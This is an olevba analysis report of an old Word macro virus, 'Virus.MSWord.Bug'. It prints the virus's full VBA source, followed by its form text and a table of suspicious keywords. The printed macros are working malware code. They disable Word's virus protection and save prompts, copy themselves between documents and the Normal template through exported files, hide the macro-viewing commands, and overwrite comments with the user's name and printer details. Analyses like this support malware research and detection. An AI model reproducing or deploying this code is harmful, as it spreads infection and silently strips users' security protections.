olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
BUG.UserForm_Click
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
If Day(Now) = 28 And Month(Now) = 7 Then BUG.Show
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
End Sub
-------------------------------------------------------------------------------
VBA MACRO BUG.frm 
in file: Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91 - OLE stream: 'Macros/VBA/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
Sub UserForm_Click()
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
On Error GoTo out
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
Options.VirusProtection = False
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
Options.SaveNormalPrompt = False
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
Options.ConfirmConversions = False
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
If nt > 0 And ad > 0 Then GoTo out
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
If nt = 0 Then
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    Set infect = NormalTemplate.VBProject.VBComponents
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    Set host = ActiveDocument.VBProject.VBComponents
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    host.Item(1).codemodule.replaceline 5, "If Day(Now) = 28 And Month(Now) = 7 Then " & Application.UserInitials & ".show"
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    host.Item(1).Name = infect.Item(1).Name
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    host.Item(2).Name = Application.UserInitials
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    host.Item(1).Export "c:\one.sys"
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    host.Item(2).Export "c:\two.sys"
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
End If
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
infect.Import ("c:\two.sys")
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
infect.Item(1).codemodule.AddFromFile ("c:\one.sys")
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
With infect.Item(1).codemodule
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    For x = 1 To 4
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    .deletelines 1
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    Next x
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    If nt = 0 Then
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    .insertlines 9, vbCr & "Sub ViewVBCode()"
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    .insertlines 11, vbCr & "End Sub"
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    .insertlines 13, vbCr & "Sub ToolsMacro()"
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    .insertlines 15, vbCr & "End Sub"
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    End If
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
End With
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
With infect.Item(2).codemodule
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    .deletelines 1
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    Next x
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
End With
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
With infect.Item(1).codemodule
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
    Next x
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
End With
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
out:
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
End Sub
'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WOOBIE 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier News
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"Das Woo"ews�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier News
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-ews�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier News
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R.I.P. July 28, 1998�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier News
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�We Love YOus�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier News
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-ews�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier News
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1992-1998ews�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier News
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be Missed9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier News
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label17'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label18'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label19'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label20'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label21'" IN 'Virus.MSWord.Bug-7f7076f22f6d5afe162c6017e567b6ab9e846e91' - OLE stream: 'Macros/BUG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|C*ZK                |432A5A4B                                     |
|Hex String|C*Z9                |432A5A39                                     |
+----------+--------------------+---------------------------------------------+

